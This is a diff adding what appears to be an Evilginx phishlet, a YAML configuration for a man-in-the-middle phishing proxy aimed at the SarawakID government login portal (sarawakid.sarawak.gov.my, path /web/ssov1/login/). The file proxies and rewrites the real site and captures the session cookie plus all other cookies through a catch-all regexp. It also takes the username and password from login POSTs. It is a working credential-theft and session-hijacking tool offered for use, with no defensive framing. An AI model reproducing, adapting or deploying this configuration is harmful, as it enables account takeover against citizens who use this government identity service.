@@ -1,0 +1,21 @@
+author: '@appeton666'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'sarawakid.sarawak.gov.my', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'sarawakid.sarawak.gov.my', orig_sub: '', domain: 'sarawakid.sarawak.gov.my', search: 'https://sarawakid.sarawak.gov.my/', replace: 'https://sarawakid.sarawak.gov.my/', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: 'sarawakid.sarawak.gov.my'
+    keys: ['PHPSESSID','.*,regexp']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'sarawakid.sarawak.gov.my'
+  path: '/web/ssov1/login/'
